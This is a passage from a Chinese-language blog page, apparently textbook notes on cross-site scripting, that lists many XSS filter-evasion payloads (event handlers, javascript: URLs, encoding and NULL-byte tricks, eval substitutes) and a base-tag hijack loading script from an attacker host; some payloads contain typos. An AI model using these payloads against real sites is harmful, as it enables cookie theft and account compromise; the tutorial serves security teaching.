+<p>上述基于Base64的字符串为：</p>
+<p><strong>&lt;script>alert(1)&lt;/script></strong></p>
+<h6 id="事件处理器"><a href="#事件处理器" class="headerlink" title="事件处理器"></a>事件处理器</h6><p>有大量事件处理器可与各种标签结合使用，以用于执行脚本。以下是一些较为少见的示例，可在不需要任何用户交互的情况下执行脚本：</p>
+<p><strong>&lt;xml onreadystatechange=alert(1)></strong></p>
+<p><strong>&lt;style onreadystatechange=alert(1)></strong></p>
+<p><strong>&lt;iframe onreadystatechange=alert(1)></strong></p>
+<p><strong>&lt;object onerror=alert(1)></strong></p>
+<p><strong>&lt;object type=image src=valid.gif onreadystatechange=alert(1)>&lt;/object></strong></p>
+<p><strong>&lt;img type=image src=valid.gif onreadystatechange=alert(1)></strong></p>
+<p><strong>&lt;input type=image src=valid.gif onreadystatechange=alert(1)></strong> </p>
+<p><strong>&lt;isindex type=image src=valid.gif onreadychangestate=alert(1)></strong></p>
+<p><strong>&lt;script onreadychangestate=alert(1)></strong></p>
+<p><strong>&lt;bgsound  onpropertychange=alert(1)></strong></p>
+<p><strong>&lt;body onbeforeactivate=alert(1)></strong></p>
+<p><strong>&lt;body onactivate=alert(1)></strong></p>
+<p><strong>&lt;body onfocusin=alert(1)></strong></p>
+<p>HTML5使用事件处理器提供了大量的向量。这包括使用autofocus属性自动触发之前需要用户交互的事件：</p>
+<p><strong>&lt;input autofocus onfocus=alert(1)></strong></p>
+<p><strong>&lt;input onblur=alert(1) autofocus>&lt;input autofocus></strong></p>
+<p><strong>&lt;body onscroll=alert(1)>&lt;br>&lt;br>...&lt;br>&lt;input autofocus></strong></p>
+<p>它允许在结束标签中使用事件处理器：</p>
+<p><strong>&lt;a onmousemove=alert(1)></strong></p>
+<p>最后HTML5还通过事件处理器引入了新标签：</p>
+<p><strong>&lt;video src=1 onerror=alert(1)></strong></p>
+<p><strong>&lt;audio src=1 onerror=alert(1)></strong></p>
+<h6 id="脚本伪协议"><a href="#脚本伪协议" class="headerlink" title="脚本伪协议"></a>脚本伪协议</h6><p>脚本伪协议可用在各种位置，以在需要URL的属性中执行行内脚本。以下是一些示例：</p>
+<p><strong>&lt;object data=javascript:alert(1)></strong></p>
+<p><strong>&lt;iframe src=javascript:alert(1)></strong></p>
+<p><strong>&lt;embed src=javascript:alert(1)></strong></p>
+<p>和事件处理器一样，HTML5也提供一些在XSS攻击蔗农使用脚本伪协议的新方法：</p>
+<p><strong>&lt;form id=test/>&lt;button form=test formaction=javascript:alert(1)></strong></p>
+<p><strong>&lt;event-source src=javascript:alert(1)></strong></p>
+<p>在针对输入过滤进行攻击时，新的event-source标签特别有用。与之前任何的HTML5标签不同，它的名字中包含一个连字符，因此，使用这个标签可以避开传统的、认为标签名称只能包含字母的基于正则表达式的过滤。</p>
+<h6 id="动态求值的样式"><a href="#动态求值的样式" class="headerlink" title="动态求值的样式"></a>动态求值的样式</h6><p>一些浏览支持在动态求值的CSS样式中使用JavaScript。以下示例可在IE7及其早期版本上执行，如果在兼容模式下运行，还可以再后续版本上执行：</p>
+<p><strong>&lt;x style=x:expression(alert(1))</strong></p>
+<p>最新版本的IE不再支持上述语法，因为这些语法只能用在XSS攻击中。但是，在最新版的IE中，使用以下请求就可以达到同样的效果：</p>
+<p><strong>&lt;x style=behavior:url(#default#time2) onbegin=alert(1)></strong></p>
+<h6 id="避开过滤-HTML"><a href="#避开过滤-HTML" class="headerlink" title="避开过滤:HTML"></a>避开过滤:HTML</h6><p>旨在阻止XSS攻击的基于签名的过滤通常采用正则表达式或其他技巧来确定关键的HTML组件，如标签括号、标签名称、属性名称和属性值。例如，过滤器可能会阻止包含使用已知可用于引入脚本的特殊标签或属性名称的HTML输入，或试图阻止以脚本伪协议开头的属性值。通过一种或多种浏览器接受的方式在HTML的关键位置插入不常见的字符，可以避开其中许多过滤。</p>
+<p>以下面这段简单的脚本为例：</p>
+<p><strong>&lt;img onerror=alert(1) src=a></strong></p>
+<p>可以通过各种方式修改这段脚本，并使它至少可以在一个浏览器中运行。</p>
+<h6 id="标签名称"><a href="#标签名称" class="headerlink" title="标签名称"></a>标签名称</h6><p>从起始标签名称开始，只需改变所使用字符的大小写，即可避开最简单的过滤：</p>
+<p><strong>&lt;iMg onerror=alert(1) src=a></strong></p>
+<p>更进一步，可以在任何位置插入NULL字节：</p>
+<p><strong>&lt;[%00]img onerror=alert(1) src=a></strong></p>
+<p><strong>&lt;i[%00]mg onerror=alert(1) src=a></strong></p>
+<p>再进一步，如果对上面的标签名称稍作修改，就可以使用任意标签名称引入事件处理器，从而避开仅仅阻止特定标签名称的过滤：</p>
+<p><strong>&lt;x onclick=alert(1) src=a>Click here&lt;/x></strong></p>
+<p>有时，可以引入不同名称的新标签，但却找不到使用这些标签直接执行代码的方法。在这些情况下，可以使用一种称为“基本标签劫持”的技巧来实施攻击。&lt;base>标签用于指定一个URL，浏览器应使用该URL解析随后在页面中出现的任何相对URL。如果可以引入一个新&lt;base>，并且页面执行反射点后的任何使用相对URL的&lt;script>，则就可以指定一个指向受你控制的服务器的基本URL。当浏览器加载在HTML页面的剩余指定部分的脚本时，这些脚本将从指定的服务器加载，但仍然能够在调用它们的页面中执行。例如：</p>
+<p><strong>&lt;base href="<a href="http://mdattacker.net/badscript.js/&quot;&gt;" target="_blank" rel="noopener">http://mdattacker.net/badscript.js/&quot;&gt;</a></strong></p>
+<p>...</p>
+<p><strong>&lt;script src="goodscript.js">&lt;/script></strong></p>
+<p>根据规范，&lt;base>标签应出现在HTML页面的&lt;head>部分。但是，一些浏览器，如Firefox，运行其出现在页面的任何位置，这显著扩大了这种攻击范围。</p>
+<h6 id="标签名称的空格"><a href="#标签名称的空格" class="headerlink" title="标签名称的空格"></a>标签名称的空格</h6><p>一些字符可用于替代标签名称与第一个属性名称之间的空格：</p>
+<p><strong>&lt;img/onerror=alert(1) src=1></strong></p>
+<p><strong>&lt;img[%09]onerror=alert(1) src=1></strong></p>
+<p><strong>&lt;img[%0d]onerror=alert(1) src=1></strong></p>
+<p><strong>&lt;img[%0a]onerror=alert(1) src=1></strong></p>
+<p><strong>&lt;img/"onerror=alert(1) src=1></strong></p>
+<p><strong>&lt;img/'onerror=alert(1) src=1></strong></p>
+<p><strong>&lt;img/anyjunk/onerror=alert(1) src=1></strong></p>
+<p>需要注意的是，即使在实施攻击时不需要任何标签属性，仍然应始终在标签名称后面添加一些多余的内容，因为这样做可以避开一些简单的过滤：</p>
+<p><strong>&lt;script/anyjunk>alert(1)&lt;script></strong></p>
+<h6 id="属性名称"><a href="#属性名称" class="headerlink" title="属性名称"></a>属性名称</h6><p>也可以在属性名称中使用上述NULL技巧。这样做可以避开许多视图通过阻止以on开头的属性名称来阻止时间过滤器的简单过滤：</p>
+<p><strong>&lt;img o[%00]nerror=alert(1) src=1></strong></p>
+<h6 id="属性分隔符"><a href="#属性分隔符" class="headerlink" title="属性分隔符"></a>属性分隔符</h6><p>在最初的示例中，属性值之间并未分割开来，因而需要在属性值后面插入一些空格，表示属性值已结束，以便于添加其他属性。属性可以选择使用双引号或单引号进行分割，或在IE上使用重音符分隔：</p>
+<p><strong>&lt;img onerror="alert(1)"src=a></strong></p>
+<p><strong>&lt;img onerror=‘alert(1)’src=a></strong></p>
+<p><strong>&lt;img onerror=<code>alert(1)</code>src=a></strong></p>
+<p>前面的示例提供了另一种方法，可用于避开一些检查以ON开头的属性名称的过滤器。如果过滤器不知道重音符被用作属性分隔符，它会将下面的示例视为仅包含一个属性，其名称不再为事件处理器的名称：</p>
+<p><strong>&lt;img src=`a`onerror=alert(1)></strong></p>
+<p>通过使用引号分隔的属性，并在标签名称后插入异常字符，就可以设计出不需要使用任何空格的攻击，从而避开一些简单的过滤:</p>
+<p><strong>&lt;/onerror="alert(1)"src=a></strong></p>
+<h6 id="属性值"><a href="#属性值" class="headerlink" title="属性值"></a>属性值</h6><p>在属性值中，可以使用NULL字节技巧。还可以使用HTML编码的字符，如下所示：</p>
+<p><strong>&lt;img onerror=a[%00]lert(1) src=a></strong></p>
+<p><strong>&lt;img onerror=a&amp;#x6c;lert(1) src=a></strong></p>
+<p>在进一步处理属性值之前，浏览器会对其进行HTML编码，因此，可以使用HTML编码对脚本代码进行模糊处理，从而避开任何过滤。例如，以下攻击避开了许多试图阻止JavaScript为协议处理器的过滤：</p>
+<p><strong>&lt;iframe src=j&amp;#x61;vasc&amp;#x72ipt&amp;#x3a;alert&amp;#x28;1&amp;#x29; ></strong></p>
+<p>在使用HTML编码时，值得注意的是，浏览器接受规范的各种辩题，甚至可能忽略过滤器“意识到”的HTML编码问题，可以使用十进制和十六进制格式，添加多余的前导零，并省略结尾的分号。以下示例至少可以用在一种浏览器中：</p>
+<p><strong>&lt;img onerror=a&amp;#x06c;ert(1) src=a></strong></p>
+<p><strong>&lt;img onerror=a&amp;#x006c;ert(1) src=a></strong></p>
+<p><strong>&lt;img onerror=a&amp;#x0006c;ert(1) src=a></strong></p>
+<p><strong>&lt;img onerror=a&amp;#x108;ert(1) src=a></strong></p>
+<p><strong>&lt;img onerror=a&amp;#0108;ert(1) src=a></strong></p>
+<p><strong>&lt;img onerror=a&amp;#x108ert(1) src=a></strong></p>
+<p><strong>&lt;img onerror=a&amp;#x0108ert(1) src=a></strong></p>
+<h6 id="标签括号"><a href="#标签括号" class="headerlink" title="标签括号"></a>标签括号</h6><p>有些时候，通过利用奇怪的应用程序或浏览器行为，甚至可以使用无效的标签括号，并且仍然使浏览器按攻击所需的方式处理相关标签。</p>
+<p>一些应用程序在应用输入过滤后还执行不必要的URL解码，因此，请求中的以下输入：</p>
+<p><strong>%253cimg%20onerror=alert(1)%20src=a%253e</strong></p>
+<p>被应用程序服务器进行URL解码，然后将以下输入传递给应用程序：</p>
+<p><strong>%3cimg onerror=alert(1) src=a%3e</strong></p>
+<p>其中并不包含任何标签括号，因此并不会被输入过滤阻止。但是引用程序随后会执行第二次URL解码，因此输入将变为：</p>
+<p><strong>&lt;img onerror=alert(1) src=a></strong></p>
+<p>该输入会回显给用户，导致攻击得以实施。</p>
+<p>如果应用程序框架基于字形和发音的相似性，将不常见的Unicode字符“转换“为它们最接近的ASCII字符，这时可能会出现与上述示例类似的情况。例如，以下输入使用Unicode双角引号（%u00AB和%u00BB），而不是标签括号：</p>
+<p><strong>《img onerror=alert(1) src=a》</strong></p>
+<p>应用程序的输入可能会允许该输入，因为其中斌不包含任何有问题的HTML。但是，如果应用程序框架在输入被插到响应中时将引号转化为标签字符，攻击将取得成功。实施证明，由于开发这段额输入，大量应用程序都易于受到这种攻击。</p>
+<p>一些输入过滤通过简单地匹配起始和结束尖括号，提取内容，并将其与标签名称黑名单进行比较来识别HTML标签。在这种情况下，可以通过使用多余的括号来避开过滤：</p>
+<p><strong>&lt;&lt;script> alert(1);//&lt;&lt;/script></strong></p>
+<p>某些情况下，可以利用浏览器的HTML解析器的异常行为来实施攻击，从而避开应用程序的输入过滤。例如，以下HTML使用了ECMAScript for XML（E4X），其中并不包含有效的起始脚本标签，但仍然可以在当前版本的Firefox中执行包含的脚本：</p>
+<p><strong>&lt;script&lt;{alert(1)}/>&lt;/script></strong></p>
+<h5 id="避开过滤：脚本代码"><a href="#避开过滤：脚本代码" class="headerlink" title="避开过滤：脚本代码"></a>避开过滤：脚本代码</h5><p>某些情况下，可以找到办法来操纵反射型输入，从而在应用程序的响应中插入脚本。但是，可能会遇到其他各种障碍，无法执行实施有效攻击所需的代码。这时，遇到的过滤通常会试图阻止使用某些JavaScript关键字和其他表达式。它们还可能阻止有用的字符，如引号、括号和圆点。</p>
+<p>和使用HTML对攻击进行模糊处理一样，也可以通过使用各种技巧来修改所需大的脚本代码</p>
+<h6 id="使用JavaScript转义"><a href="#使用JavaScript转义" class="headerlink" title="使用JavaScript转义"></a>使用JavaScript转义</h6><p>JavaScript允许各种字符转义，可以通过这种方式避免包含原义格式的表达式。Unicode转义可用于表示JavaScript关键字中的字符，从而避开许多类型的过滤：</p>
+<p><strong>&lt;script>a\u006cert(1);&lt;/script></strong></p>
+<p>如果能够使用eval命令，就可以将其他命令以字符串格式传送给eval命令，从而执行这些命令。这样就可以利用各种字符串操纵技巧来隐藏执行的命令。</p>
+<p>在JavaScript中，可以使用Unicode转义、十六进制转义和八进制转义：</p>
+<p><strong>&lt;script>eval('a\u600cert(1)');&lt;script></strong></p>
+<p><strong>&lt;script>eval('a\x6cert(1)');&lt;script></strong></p>
+<p><strong>&lt;script>eval('a\154ert(1)');&lt;script></strong></p>
+<p>此外， 字符串中的多余转义字符将被忽略：</p>
+<p><strong>&lt;script>eval('a\l\ert\(1\)');&lt;script></strong></p>
+<h6 id="动态构建字符串"><a href="#动态构建字符串" class="headerlink" title="动态构建字符串"></a>动态构建字符串</h6><p>可以使用其他技巧来动态构建在攻击中使用的字符串：</p>
+<p><strong>&lt;script>eval('al' + 'ert(1)');&lt;/script></strong></p>
+<p><strong>&lt;script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));&lt;/script></strong></p>
+<p><strong>&lt;script>eval(atob('amF2YXNjcmlwdDphbGVydCgxKQ'));&lt;/script></strong></p>
+<h6 id="替代eval的方法"><a href="#替代eval的方法" class="headerlink" title="替代eval的方法"></a>替代eval的方法</h6><p>如果无直接调用eval命令，可以通过其他方法以字符串格式执行命令：</p>
+<p><strong>&lt;script>'alert(1)'.replace(/. + /,eval)&lt;/script></strong></p>
+<p><strong>&lt;script>function::['alert'](1)&lt;/script></strong></p>
+<h6 id="替代圆点"><a href="#替代圆点" class="headerlink" title="替代圆点"></a>替代圆点</h6><p>如果圆点被阻止，可以使用以下方法解引用：</p>
+<p><strong>&lt;script>alert(document['cookie'])&lt;/script></strong></p>
+<p><strong>&lt;script>with(document)alert(cookie)&lt;/script></strong></p>
+<h3 id="查找并利用保存型XSS漏洞"><a href="#查找并利用保存型XSS漏洞" class="headerlink" title="查找并利用保存型XSS漏洞"></a>查找并利用保存型XSS漏洞</h3><h4 id="在Web邮件应用程序中测试XSS"><a href="#在Web邮件应用程序中测试XSS" class="headerlink" title="在Web邮件应用程序中测试XSS"></a>在Web邮件应用程序中测试XSS</h4><h4 id="在上传文件中测试XSS"><a href="#在上传文件中测试XSS" class="headerlink" title="在上传文件中测试XSS"></a>在上传文件中测试XSS</h4><h4 id="混合文件攻击"><a href="#混合文件攻击" class="headerlink" title="混合文件攻击"></a>混合文件攻击</h4><h4 id="在通过Ajax上传的文件中测试XSS"><a href="#在通过Ajax上传的文件中测试XSS" class="headerlink" title="在通过Ajax上传的文件中测试XSS"></a>在通过Ajax上传的文件中测试XSS</h4><h3 id="查找并利用基于DOM的XSS漏洞"><a href="#查找并利用基于DOM的XSS漏洞" class="headerlink" title="查找并利用基于DOM的XSS漏洞"></a>查找并利用基于DOM的XSS漏洞</h3><h2 id="防止XSS攻击"><a href="#防止XSS攻击" class="headerlink" title="防止XSS攻击"></a>防止XSS攻击</h2><h3 id="防止反射型与保存型XSS漏洞"><a href="#防止反射型与保存型XSS漏洞" class="headerlink" title="防止反射型与保存型XSS漏洞"></a>防止反射型与保存型XSS漏洞</h3><h4 id="确认输入"><a href="#确认输入" class="headerlink" title="确认输入"></a>确认输入</h4><h4 id="确认输出"><a href="#确认输出" class="headerlink" title="确认输出"></a>确认输出</h4><h4 id="消除危险的插入点"><a href="#消除危险的插入点" class="headerlink" title="消除危险的插入点"></a>消除危险的插入点</h4><h4 id="允许有限的HTML"><a href="#允许有限的HTML" class="headerlink" title="允许有限的HTML"></a>允许有限的HTML</h4><h3 id="防止基于DOM的XSS漏洞"><a href="#防止基于DOM的XSS漏洞" class="headerlink" title="防止基于DOM的XSS漏洞"></a>防止基于DOM的XSS漏洞</h3><h4 id="确认输入-1"><a href="#确认输入-1" class="headerlink" title="确认输入"></a>确认输入</h4><h4 id="确认输出-1"><a href="#确认输出-1" class="headerlink" title="确认输出"></a>确认输出</h4></script></p></li></ul>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
+          
+            <a href="/tags/Web/" rel="tag"># Web</a>
+          
+            <a href="/tags/XSS%E6%94%BB%E5%87%BB/" rel="tag"># XSS攻击</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/01/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/5-5-%E6%B3%A8%E5%85%A5email/" rel="next" title="注入电子邮件">
+                <i class="fa fa-chevron-left"></i> 注入电子邮件
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/02/LeetCode/leetcode-001365.-How-Many-Numbers-Are-Smaller-Than-the-Current-Number/" rel="prev" title="1365. How Many Numbers Are Smaller Than the Current Number">
+                1365. How Many Numbers Are Smaller Than the Current Number <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Han si</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">184</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">71</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:kw120943839@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS攻击"><span class="nav-number">1.</span> <span class="nav-text">XSS攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#反射型XSS漏洞"><span class="nav-number">1.1.</span> <span class="nav-text">反射型XSS漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用漏洞"><span class="nav-number">1.1.1.</span> <span class="nav-text">利用漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#保存型XSS漏洞"><span class="nav-number">1.2.</span> <span class="nav-text">保存型XSS漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于DOM的XSS"><span class="nav-number">1.3.</span> <span class="nav-text">基于DOM的XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS攻击的传送机制"><span class="nav-number">1.4.</span> <span class="nav-text">XSS攻击的传送机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#传送反射型与基于DOM的XSS攻击"><span class="nav-number">1.4.1.</span> <span class="nav-text">传送反射型与基于DOM的XSS攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#传送保存型XSS攻击"><span class="nav-number">1.4.2.</span> <span class="nav-text">传送保存型XSS攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查找并利用XSS漏洞"><span class="nav-number">1.5.</span> <span class="nav-text">查找并利用XSS漏洞</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Han si</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('-1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
